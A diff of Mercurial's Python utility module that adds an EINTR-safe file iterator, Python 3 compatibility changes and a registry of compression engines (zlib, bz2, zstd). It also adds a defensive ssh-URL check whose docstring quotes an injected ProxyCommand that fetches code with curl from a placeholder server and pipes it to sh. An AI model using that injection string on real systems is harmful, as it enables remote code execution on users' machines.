+    # On modern systems like Linux, the "read" syscall cannot be interrupted
+    # when reading "fast" files like on-disk files. So the EINTR issue only
+    # affects things like pipes, sockets, ttys etc. We treat "normal" (S_ISREG)
+    # files approximately as "fast" files and use the fast (unsafe) code path,
+    # to minimize the performance impact.
+    if sys.version_info >= (2, 7, 4):
+        # fp.readline deals with EINTR correctly, use it as a workaround.
+        def _safeiterfile(fp):
+            return iter(fp.readline, '')
+    else:
+        # fp.read* are broken too, manually deal with EINTR in a stupid way.
+        # note: this may block longer than necessary because of bufsize.
+        def _safeiterfile(fp, bufsize=4096):
+            fd = fp.fileno()
+            line = ''
+            while True:
+                try:
+                    buf = os.read(fd, bufsize)
+                except OSError as ex:
+                    # os.read only raises EINTR before any data is read
+                    if ex.errno == errno.EINTR:
+                        continue
+                    else:
+                        raise
+                line += buf
+                if '\n' in buf:
+                    splitted = line.splitlines(True)
+                    line = ''
+                    for l in splitted:
+                        if l[-1] == '\n':
+                            yield l
+                        else:
+                            line = l
+                if not buf:
+                    break
+            if line:
+                yield line
+
+    def iterfile(fp):
+        fastpath = True
+        if type(fp) is file:
+            fastpath = stat.S_ISREG(os.fstat(fp.fileno()).st_mode)
+        if fastpath:
+            return fp
+        else:
+            return _safeiterfile(fp)
+else:
+    # PyPy and CPython 3 do not have the EINTR issue thus no workaround needed.
+    def iterfile(fp):
+        return fp
 
 def iterlines(iterator):
     for chunk in iterator:
@@ -2206,9 +2486,9 @@ def hgcmd():
     if mainfrozen():
         if getattr(sys, 'frozen', None) == 'macosx_app':
             # Env variable set by py2app
-            return [os.environ['EXECUTABLEPATH']]
+            return [encoding.environ['EXECUTABLEPATH']]
         else:
-            return [sys.executable]
+            return [pycompat.sysexecutable]
     return gethgcmd()
 
 def rundetached(args, condfn):
@@ -2378,7 +2658,7 @@ class url(object):
 
     _safechars = "!~*'()+"
     _safepchars = "/!~*'()+:\\"
-    _matchscheme = remod.compile(r'^[a-zA-Z0-9+.\-]+:').match
+    _matchscheme = remod.compile('^[a-zA-Z0-9+.\\-]+:').match
 
     def __init__(self, path, parsequery=True, parsefragment=True):
         # We slowly chomp away at path until we have only the path left
@@ -2392,7 +2672,7 @@ class url(object):
             path, self.fragment = path.split('#', 1)
 
         # special case for Windows drive letters and UNC paths
-        if hasdriveletter(path) or path.startswith(r'\\'):
+        if hasdriveletter(path) or path.startswith('\\\\'):
             self.path = path
             return
 
@@ -2470,7 +2750,7 @@ class url(object):
                   'path', 'fragment'):
             v = getattr(self, a)
             if v is not None:
-                setattr(self, a, pycompat.urlparse.unquote(v))
+                setattr(self, a, urlreq.unquote(v))
 
     def __repr__(self):
         attrs = []
@@ -2481,7 +2761,7 @@ class url(object):
                 attrs.append('%s: %r' % (a, v))
         return '<url %s>' % ', '.join(attrs)
 
-    def __str__(self):
+    def __bytes__(self):
         r"""Join the URL's components back into a URL string.
 
         Examples:
@@ -2558,11 +2838,13 @@ class url(object):
             s += '#' + urlreq.quote(self.fragment, safe=self._safepchars)
         return s
 
+    __str__ = encoding.strmethod(__bytes__)
+
     def authinfo(self):
         user, passwd = self.user, self.passwd
         try:
             self.user, self.passwd = None, None
-            s = str(self)
+            s = bytes(self)
         finally:
             self.user, self.passwd = user, passwd
         if not self.user:
@@ -2579,7 +2861,7 @@ class url(object):
             return True # remote URL
         if hasdriveletter(self.path):
             return True # absolute for our purposes - can't be joined()
-        if self.path.startswith(r'\\'):
+        if self.path.startswith(br'\\'):
             return True # Windows UNC path
         if self.path.startswith('/'):
             return True # POSIX-style
@@ -2612,24 +2894,33 @@ def hasdriveletter(path):
 def urllocalpath(path):
     return url(path, parsequery=False, parsefragment=False).localpath()
 
+def checksafessh(path):
+    """check if a path / url is a potentially unsafe ssh exploit (SEC)
+
+    This is a sanity check for ssh urls. ssh will parse the first item as
+    an option; e.g. ssh://-oProxyCommand=curl${IFS}bad.server|sh/path.
+    Let's prevent these potentially exploited urls entirely and warn the
+    user.
+
+    Raises an error.Abort when the url is unsafe.
+    """
+    path = urlreq.unquote(path)
+    if path.startswith('ssh://-') or path.startswith('svn+ssh://-'):
+        raise error.Abort(_('potentially unsafe url: %r') %
+                          (path,))
+
 def hidepassword(u):
     '''hide user credential in a url string'''
     u = url(u)
     if u.passwd:
         u.passwd = '***'
-    return str(u)
+    return bytes(u)
 
 def removeauth(u):
     '''remove all authentication information from a url string'''
     u = url(u)
     u.user = u.passwd = None
     return str(u)
-
-def isatty(fp):
-    try:
-        return fp.isatty()
-    except AttributeError:
-        return False
 
 timecount = unitcountfn(
     (1, 1e3, _('%.0f s')),
@@ -2661,17 +2952,17 @@ def timed(func):
     '''
 
     def wrapper(*args, **kwargs):
-        start = time.time()
+        start = timer()
         indent = 2
         _timenesting[0] += indent
         try:
             return func(*args, **kwargs)
         finally:
-            elapsed = time.time() - start
+            elapsed = timer() - start
             _timenesting[0] -= indent
-            sys.stderr.write('%s%s: %s\n' %
-                             (' ' * _timenesting[0], func.__name__,
-                              timecount(elapsed)))
+            stderr.write('%s%s: %s\n' %
+                         (' ' * _timenesting[0], func.__name__,
+                          timecount(elapsed)))
     return wrapper
 
 _sizeunits = (('m', 2**20), ('k', 2**10), ('g', 2**30),
@@ -2714,9 +3005,9 @@ class hooks(object):
             results.append(hook(*args))
         return results
 
-def getstackframes(skip=0, line=' %-*s in %s\n', fileline='%s:%s'):
+def getstackframes(skip=0, line=' %-*s in %s\n', fileline='%s:%s', depth=0):
     '''Yields lines for a nicely formatted stacktrace.
-    Skips the 'skip' last entries.
+    Skips the 'skip' last entries, then return the last 'depth' entries.
     Each file+linenumber is formatted according to fileline.
     Each line is formatted according to line.
     If line is None, it yields:
@@ -2727,7 +3018,8 @@ def getstackframes(skip=0, line=' %-*s in %s\n', fileline='%s:%s'):
     Not be used in production code but very convenient while developing.
     '''
     entries = [(fileline % (fn, ln), func)
-        for fn, ln, func, _text in traceback.extract_stack()[:-skip - 1]]
+        for fn, ln, func, _text in traceback.extract_stack()[:-skip - 1]
+        ][-depth:]
     if entries:
         fnmax = max(len(entry[0]) for entry in entries)
         for fnln, func in entries:
@@ -2736,16 +3028,18 @@ def getstackframes(skip=0, line=' %-*s in %s\n', fileline='%s:%s'):
             else:
                 yield line % (fnmax, fnln, func)
 
-def debugstacktrace(msg='stacktrace', skip=0, f=sys.stderr, otherf=sys.stdout):
+def debugstacktrace(msg='stacktrace', skip=0,
+                    f=stderr, otherf=stdout, depth=0):
     '''Writes a message to f (stderr) with a nicely formatted stacktrace.
-    Skips the 'skip' last entries. By default it will flush stdout first.
+    Skips the 'skip' entries closest to the call, then show 'depth' entries.
+    By default it will flush stdout first.
     It can be used everywhere and intentionally does not require an ui object.
     Not be used in production code but very convenient while developing.
     '''
     if otherf:
         otherf.flush()
-    f.write('%s at:\n' % msg)
-    for line in getstackframes(skip + 1):
+    f.write('%s at:\n' % msg.rstrip())
+    for line in getstackframes(skip + 1, depth=depth):
         f.write(line)
     f.flush()
 
@@ -2780,7 +3074,7 @@ class dirs(object):
             del dirs[base]
 
     def __iter__(self):
-        return self._dirs.iterkeys()
+        return iter(self._dirs)
 
     def __contains__(self, d):
         return d in self._dirs
@@ -2794,106 +3088,632 @@ def finddirs(path):
         yield path[:pos]
         pos = path.rfind('/', 0, pos)
 
-# compression utility
+# compression code
 
-class nocompress(object):
-    def compress(self, x):
-        return x
-    def flush(self):
-        return ""
+SERVERROLE = 'server'
+CLIENTROLE = 'client'
 
-compressors = {
-    None: nocompress,
-    # lambda to prevent early import
-    'BZ': lambda: bz2.BZ2Compressor(),
-    'GZ': lambda: zlib.compressobj(),
-    }
-# also support the old form by courtesies
-compressors['UN'] = compressors[None]
+compewireprotosupport = collections.namedtuple(u'compenginewireprotosupport',
+                                               (u'name', u'serverpriority',
+                                                u'clientpriority'))
 
-def _makedecompressor(decompcls):
-    def generator(f):
-        d = decompcls()
-        for chunk in filechunkiter(f):
-            yield d.decompress(chunk)
-    def func(fh):
-        return chunkbuffer(generator(fh))
-    return func
+class compressormanager(object):
+    """Holds registrations of various compression engines.
 
-class ctxmanager(object):
-    '''A context manager for use in 'with' blocks to allow multiple
-    contexts to be entered at once.  This is both safer and more
-    flexible than contextlib.nested.
+    This class essentially abstracts the differences between compression
+    engines to allow new compression formats to be added easily, possibly from
+    extensions.
 
-    Once Mercurial supports Python 2.7+, this will become mostly
-    unnecessary.
-    '''
+    Compressors are registered against the global instance by calling its
+    ``register()`` method.
+    """
+    def __init__(self):
+        self._engines = {}
+        # Bundle spec human name to engine name.
+        self._bundlenames = {}
+        # Internal bundle identifier to engine name.
+        self._bundletypes = {}
+        # Revlog header to engine name.
+        self._revlogheaders = {}
+        # Wire proto identifier to engine name.
+        self._wiretypes = {}
 
-    def __init__(self, *args):
-        '''Accepts a list of no-argument functions that return context
-        managers.  These will be invoked at __call__ time.'''
-        self._pending = args
-        self._atexit = []
+    def __getitem__(self, key):
+        return self._engines[key]
 
-    def __enter__(self):
-        return self
+    def __contains__(self, key):
+        return key in self._engines
 
-    def enter(self):
-        '''Create and enter context managers in the order in which they were
-        passed to the constructor.'''
-        values = []
-        for func in self._pending:
-            obj = func()
-            values.append(obj.__enter__())
-            self._atexit.append(obj.__exit__)
-        del self._pending
-        return values
+    def __iter__(self):
+        return iter(self._engines.keys())
 
-    def atexit(self, func, *args, **kwargs):
-        '''Add a function to call when this context manager exits.  The
-        ordering of multiple atexit calls is unspecified, save that
-        they will happen before any __exit__ functions.'''
-        def wrapper(exc_type, exc_val, exc_tb):
-            func(*args, **kwargs)
-        self._atexit.append(wrapper)
-        return func
+    def register(self, engine):
+        """Register a compression engine with the manager.
 
-    def __exit__(self, exc_type, exc_val, exc_tb):
-        '''Context managers are exited in the reverse order from which
-        they were created.'''
-        received = exc_type is not None
-        suppressed = False
-        pending = None
-        self._atexit.reverse()
-        for exitfunc in self._atexit:
+        The argument must be a ``compressionengine`` instance.
+        """
+        if not isinstance(engine, compressionengine):
+            raise ValueError(_('argument must be a compressionengine'))
+
+        name = engine.name()
+
+        if name in self._engines:
+            raise error.Abort(_('compression engine %s already registered') %
+                              name)
+
+        bundleinfo = engine.bundletype()
+        if bundleinfo:
+            bundlename, bundletype = bundleinfo
+
+            if bundlename in self._bundlenames:
+                raise error.Abort(_('bundle name %s already registered') %
+                                  bundlename)
+            if bundletype in self._bundletypes:
+                raise error.Abort(_('bundle type %s already registered by %s') %
+                                  (bundletype, self._bundletypes[bundletype]))
+
+            # No external facing name declared.
+            if bundlename:
+                self._bundlenames[bundlename] = name
+
+            self._bundletypes[bundletype] = name
+
+        wiresupport = engine.wireprotosupport()
+        if wiresupport:
+            wiretype = wiresupport.name
+            if wiretype in self._wiretypes:
+                raise error.Abort(_('wire protocol compression %s already '
+                                    'registered by %s') %
+                                  (wiretype, self._wiretypes[wiretype]))
+
+            self._wiretypes[wiretype] = name
+
+        revlogheader = engine.revlogheader()
+        if revlogheader and revlogheader in self._revlogheaders:
+            raise error.Abort(_('revlog header %s already registered by %s') %
+                              (revlogheader, self._revlogheaders[revlogheader]))
+
+        if revlogheader:
+            self._revlogheaders[revlogheader] = name
+
+        self._engines[name] = engine
+
+    @property
+    def supportedbundlenames(self):
+        return set(self._bundlenames.keys())
+
+    @property
+    def supportedbundletypes(self):
+        return set(self._bundletypes.keys())
+
+    def forbundlename(self, bundlename):
+        """Obtain a compression engine registered to a bundle name.
+
+        Will raise KeyError if the bundle type isn't registered.
+
+        Will abort if the engine is known but not available.
+        """
+        engine = self._engines[self._bundlenames[bundlename]]
+        if not engine.available():
+            raise error.Abort(_('compression engine %s could not be loaded') %
+                              engine.name())
+        return engine
+
+    def forbundletype(self, bundletype):
+        """Obtain a compression engine registered to a bundle type.
+
+        Will raise KeyError if the bundle type isn't registered.
+
+        Will abort if the engine is known but not available.
+        """
+        engine = self._engines[self._bundletypes[bundletype]]
+        if not engine.available():
+            raise error.Abort(_('compression engine %s could not be loaded') %
+                              engine.name())
+        return engine
+
+    def supportedwireengines(self, role, onlyavailable=True):
+        """Obtain compression engines that support the wire protocol.
+
+        Returns a list of engines in prioritized order, most desired first.
+
+        If ``onlyavailable`` is set, filter out engines that can't be
+        loaded.
+        """
+        assert role in (SERVERROLE, CLIENTROLE)
+
+        attr = 'serverpriority' if role == SERVERROLE else 'clientpriority'
+
+        engines = [self._engines[e] for e in self._wiretypes.values()]
+        if onlyavailable:
+            engines = [e for e in engines if e.available()]
+
+        def getkey(e):
+            # Sort first by priority, highest first. In case of tie, sort
+            # alphabetically. This is arbitrary, but ensures output is
+            # stable.
+            w = e.wireprotosupport()
+            return -1 * getattr(w, attr), w.name
+
+        return list(sorted(engines, key=getkey))
+
+    def forwiretype(self, wiretype):
+        engine = self._engines[self._wiretypes[wiretype]]
+        if not engine.available():
+            raise error.Abort(_('compression engine %s could not be loaded') %
+                              engine.name())
+        return engine
+
+    def forrevlogheader(self, header):
+        """Obtain a compression engine registered to a revlog header.
+
+        Will raise KeyError if the revlog header value isn't registered.
+        """
+        return self._engines[self._revlogheaders[header]]
+
+compengines = compressormanager()
+
+class compressionengine(object):
+    """Base class for compression engines.
+
+    Compression engines must implement the interface defined by this class.
+    """
+    def name(self):
+        """Returns the name of the compression engine.
+
+        This is the key the engine is registered under.
+
+        This method must be implemented.
+        """
+        raise NotImplementedError()
+
+    def available(self):
+        """Whether the compression engine is available.
+
+        The intent of this method is to allow optional compression engines
+        that may not be available in all installations (such as engines relying
+        on C extensions that may not be present).
+        """
+        return True
+
+    def bundletype(self):
+        """Describes bundle identifiers for this engine.
+
+        If this compression engine isn't supported for bundles, returns None.
+
+        If this engine can be used for bundles, returns a 2-tuple of strings of
+        the user-facing "bundle spec" compression name and an internal
+        identifier used to denote the compression format within bundles. To
+        exclude the name from external usage, set the first element to ``None``.
+
+        If bundle compression is supported, the class must also implement
+        ``compressstream`` and `decompressorreader``.
+
+        The docstring of this method is used in the help system to tell users
+        about this engine.
+        """
+        return None
+
+    def wireprotosupport(self):
+        """Declare support for this compression format on the wire protocol.
+
+        If this compression engine isn't supported for compressing wire
+        protocol payloads, returns None.
+
+        Otherwise, returns ``compenginewireprotosupport`` with the following
+        fields:
+
+        * String format identifier
+        * Integer priority for the server
+        * Integer priority for the client
+
+        The integer priorities are used to order the advertisement of format
+        support by server and client. The highest integer is advertised
+        first. Integers with non-positive values aren't advertised.
+
+        The priority values are somewhat arbitrary and only used for default
+        ordering. The relative order can be changed via config options.
+
+        If wire protocol compression is supported, the class must also implement
+        ``compressstream`` and ``decompressorreader``.
+        """
+        return None
+
+    def revlogheader(self):
+        """Header added to revlog chunks that identifies this engine.
+
+        If this engine can be used to compress revlogs, this method should
+        return the bytes used to identify chunks compressed with this engine.
+        Else, the method should return ``None`` to indicate it does not
+        participate in revlog compression.
+        """
+        return None
+
+    def compressstream(self, it, opts=None):
+        """Compress an iterator of chunks.
+
+        The method receives an iterator (ideally a generator) of chunks of
+        bytes to be compressed. It returns an iterator (ideally a generator)
+        of bytes of chunks representing the compressed output.
+
+        Optionally accepts an argument defining how to perform compression.
+        Each engine treats this argument differently.
+        """
+        raise NotImplementedError()
+
+    def decompressorreader(self, fh):
+        """Perform decompression on a file object.
+
+        Argument is an object with a ``read(size)`` method that returns
+        compressed data. Return value is an object with a ``read(size)`` that
+        returns uncompressed data.
+        """
+        raise NotImplementedError()
+
+    def revlogcompressor(self, opts=None):
+        """Obtain an object that can be used to compress revlog entries.
+
+        The object has a ``compress(data)`` method that compresses binary
+        data. This method returns compressed binary data or ``None`` if
+        the data could not be compressed (too small, not compressible, etc).
+        The returned data should have a header uniquely identifying this
+        compression format so decompression can be routed to this engine.
+        This header should be identified by the ``revlogheader()`` return
+        value.
+
+        The object has a ``decompress(data)`` method that decompresses
+        data. The method will only be called if ``data`` begins with
+        ``revlogheader()``. The method should return the raw, uncompressed
+        data or raise a ``RevlogError``.
+
+        The object is reusable but is not thread safe.
+        """
+        raise NotImplementedError()
+
+class _zlibengine(compressionengine):
+    def name(self):
+        return 'zlib'
+
+    def bundletype(self):
+        """zlib compression using the DEFLATE algorithm.
+
+        All Mercurial clients should support this format. The compression
+        algorithm strikes a reasonable balance between compression ratio
+        and size.
+        """
+        return 'gzip', 'GZ'
+
+    def wireprotosupport(self):
+        return compewireprotosupport('zlib', 20, 20)
+
+    def revlogheader(self):
+        return 'x'
+
+    def compressstream(self, it, opts=None):
+        opts = opts or {}
+
+        z = zlib.compressobj(opts.get('level', -1))
+        for chunk in it:
+            data = z.compress(chunk)
+            # Not all calls to compress emit data. It is cheaper to inspect
+            # here than to feed empty chunks through generator.
+            if data:
+                yield data
+
+        yield z.flush()
+
+    def decompressorreader(self, fh):
+        def gen():
+            d = zlib.decompressobj()
+            for chunk in filechunkiter(fh):
+                while chunk:
+                    # Limit output size to limit memory.
+                    yield d.decompress(chunk, 2 ** 18)
+                    chunk = d.unconsumed_tail
+
+        return chunkbuffer(gen())
+
+    class zlibrevlogcompressor(object):
+        def compress(self, data):
+            insize = len(data)
+            # Caller handles empty input case.
+            assert insize > 0
+
+            if insize < 44:
+                return None
+
+            elif insize <= 1000000:
+                compressed = zlib.compress(data)
+                if len(compressed) < insize:
+                    return compressed
+                return None
+
+            # zlib makes an internal copy of the input buffer, doubling
+            # memory usage for large inputs. So do streaming compression
+            # on large inputs.
+            else:
+                z = zlib.compressobj()
+                parts = []
+                pos = 0
+                while pos < insize:
+                    pos2 = pos + 2**20
+                    parts.append(z.compress(data[pos:pos2]))
+                    pos = pos2
+                parts.append(z.flush())
+
+                if sum(map(len, parts)) < insize:
+                    return ''.join(parts)
+                return None
+
+        def decompress(self, data):
             try:
-                if exitfunc(exc_type, exc_val, exc_tb):
-                    suppressed = True
-                    exc_type = None
-                    exc_val = None
-                    exc_tb = None
-            except BaseException:
-                pending = sys.exc_info()
-                exc_type, exc_val, exc_tb = pending = sys.exc_info()
-        del self._atexit
-        if pending:
-            raise exc_val
-        return received and suppressed
+                return zlib.decompress(data)
+            except zlib.error as e:
+                raise error.RevlogError(_('revlog decompress error: %s') %
+                                        str(e))
 
-def _bz2():
-    d = bz2.BZ2Decompressor()
-    # Bzip2 stream start with BZ, but we stripped it.
-    # we put it back for good measure.
-    d.decompress('BZ')
-    return d
+    def revlogcompressor(self, opts=None):
+        return self.zlibrevlogcompressor()
 
-decompressors = {None: lambda fh: fh,
-                 '_truncatedBZ': _makedecompressor(_bz2),
-                 'BZ': _makedecompressor(lambda: bz2.BZ2Decompressor()),
-                 'GZ': _makedecompressor(lambda: zlib.decompressobj()),
-                 }
-# also support the old form by courtesies
-decompressors['UN'] = decompressors[None]
+compengines.register(_zlibengine())
+
+class _bz2engine(compressionengine):
+    def name(self):
+        return 'bz2'
+
+    def bundletype(self):
+        """An algorithm that produces smaller bundles than ``gzip``.
+
+        All Mercurial clients should support this format.
+
+        This engine will likely produce smaller bundles than ``gzip`` but
+        will be significantly slower, both during compression and
+        decompression.
+
+        If available, the ``zstd`` engine can yield similar or better
+        compression at much higher speeds.
+        """
+        return 'bzip2', 'BZ'
+
+    # We declare a protocol name but don't advertise by default because
+    # it is slow.
+    def wireprotosupport(self):
+        return compewireprotosupport('bzip2', 0, 0)
+
+    def compressstream(self, it, opts=None):
+        opts = opts or {}
+        z = bz2.BZ2Compressor(opts.get('level', 9))
+        for chunk in it:
+            data = z.compress(chunk)
+            if data:
+                yield data
+
+        yield z.flush()
+
+    def decompressorreader(self, fh):
+        def gen():
+            d = bz2.BZ2Decompressor()
+            for chunk in filechunkiter(fh):
+                yield d.decompress(chunk)
+
+        return chunkbuffer(gen())
+
+compengines.register(_bz2engine())
+
+class _truncatedbz2engine(compressionengine):
+    def name(self):
+        return 'bz2truncated'
+
+    def bundletype(self):
+        return None, '_truncatedBZ'
+
+    # We don't implement compressstream because it is hackily handled elsewhere.
+
+    def decompressorreader(self, fh):
+        def gen():
+            # The input stream doesn't have the 'BZ' header. So add it back.
+            d = bz2.BZ2Decompressor()
+            d.decompress('BZ')
+            for chunk in filechunkiter(fh):
+                yield d.decompress(chunk)
+
+        return chunkbuffer(gen())
+
+compengines.register(_truncatedbz2engine())
+
+class _noopengine(compressionengine):
+    def name(self):
+        return 'none'
+
+    def bundletype(self):
+        """No compression is performed.
+
+        Use this compression engine to explicitly disable compression.
+        """
+        return 'none', 'UN'
+
+    # Clients always support uncompressed payloads. Servers don't because
+    # unless you are on a fast network, uncompressed payloads can easily
+    # saturate your network pipe.
+    def wireprotosupport(self):
+        return compewireprotosupport('none', 0, 10)
+
+    # We don't implement revlogheader because it is handled specially
+    # in the revlog class.
+
+    def compressstream(self, it, opts=None):
+        return it
+
+    def decompressorreader(self, fh):
+        return fh
+
+    class nooprevlogcompressor(object):
+        def compress(self, data):
+            return None
+
+    def revlogcompressor(self, opts=None):
+        return self.nooprevlogcompressor()
+
+compengines.register(_noopengine())
+
+class _zstdengine(compressionengine):
+    def name(self):
+        return 'zstd'
+
+    @propertycache
+    def _module(self):
+        # Not all installs have the zstd module available. So defer importing
+        # until first access.
+        try:
+            from . import zstd
+            # Force delayed import.
+            zstd.__version__
+            return zstd
+        except ImportError:
+            return None
+
+    def available(self):
+        return bool(self._module)
+
+    def bundletype(self):
+        """A modern compression algorithm that is fast and highly flexible.
+
+        Only supported by Mercurial 4.1 and newer clients.
+
+        With the default settings, zstd compression is both faster and yields
+        better compression than ``gzip``. It also frequently yields better
+        compression than ``bzip2`` while operating at much higher speeds.
+
+        If this engine is available and backwards compatibility is not a
+        concern, it is likely the best available engine.
+        """
+        return 'zstd', 'ZS'
+
+    def wireprotosupport(self):
+        return compewireprotosupport('zstd', 50, 50)
+
+    def revlogheader(self):
+        return '\x28'
+
+    def compressstream(self, it, opts=None):
+        opts = opts or {}
+        # zstd level 3 is almost always significantly faster than zlib
+        # while providing no worse compression. It strikes a good balance
+        # between speed and compression.
+        level = opts.get('level', 3)
+
+        zstd = self._module
+        z = zstd.ZstdCompressor(level=level).compressobj()
+        for chunk in it:
+            data = z.compress(chunk)
+            if data:
+                yield data
+
+        yield z.flush()
+
+    def decompressorreader(self, fh):
+        zstd = self._module
+        dctx = zstd.ZstdDecompressor()
+        return chunkbuffer(dctx.read_from(fh))
+
+    class zstdrevlogcompressor(object):
+        def __init__(self, zstd, level=3):
+            # Writing the content size adds a few bytes to the output. However,
+            # it allows decompression to be more optimal since we can
+            # pre-allocate a buffer to hold the result.
+            self._cctx = zstd.ZstdCompressor(level=level,
+                                             write_content_size=True)
+            self._dctx = zstd.ZstdDecompressor()
+            self._compinsize = zstd.COMPRESSION_RECOMMENDED_INPUT_SIZE
+            self._decompinsize = zstd.DECOMPRESSION_RECOMMENDED_INPUT_SIZE
+
+        def compress(self, data):
+            insize = len(data)
+            # Caller handles empty input case.
+            assert insize > 0
+
+            if insize < 50:
+                return None
+
+            elif insize <= 1000000:
+                compressed = self._cctx.compress(data)
+                if len(compressed) < insize:
+                    return compressed
+                return None
+            else:
+                z = self._cctx.compressobj()
+                chunks = []
+                pos = 0
+                while pos < insize:
+                    pos2 = pos + self._compinsize
+                    chunk = z.compress(data[pos:pos2])
+                    if chunk:
+                        chunks.append(chunk)
+                    pos = pos2
+                chunks.append(z.flush())
+
+                if sum(map(len, chunks)) < insize:
+                    return ''.join(chunks)
+                return None
+
+        def decompress(self, data):
+            insize = len(data)
+
+            try:
+                # This was measured to be faster than other streaming
+                # decompressors.
+                dobj = self._dctx.decompressobj()
+                chunks = []
+                pos = 0
+                while pos < insize:
+                    pos2 = pos + self._decompinsize
+                    chunk = dobj.decompress(data[pos:pos2])
+                    if chunk:
+                        chunks.append(chunk)
+                    pos = pos2
+                # Frame should be exhausted, so no finish() API.
+
+                return ''.join(chunks)
+            except Exception as e:
+                raise error.RevlogError(_('revlog decompress error: %s') %
+                                        str(e))
+
+    def revlogcompressor(self, opts=None):
+        opts = opts or {}
+        return self.zstdrevlogcompressor(self._module,
+                                         level=opts.get('level', 3))
+
+compengines.register(_zstdengine())
+
+def bundlecompressiontopics():
+    """Obtains a list of available bundle compressions for use in help."""
+    # help.makeitemsdocs() expects a dict of names to items with a .__doc__.
+    items = {}
+
+    # We need to format the docstring. So use a dummy object/type to hold it
+    # rather than mutating the original.
+    class docobject(object):
+        pass
+
+    for name in compengines:
+        engine = compengines[name]
+
+        if not engine.available():
+            continue
+
+        bt = engine.bundletype()
+        if not bt or not bt[0]:
+            continue
+
+        doc = pycompat.sysstr('``%s``\n    %s') % (
+            bt[0], engine.bundletype.__doc__)
+
+        value = docobject()
+        value.__doc__ = doc
+
+        items[bt[0]] = value
+
+    return items
 
 # convenient shortcut
 dst = debugstacktrace
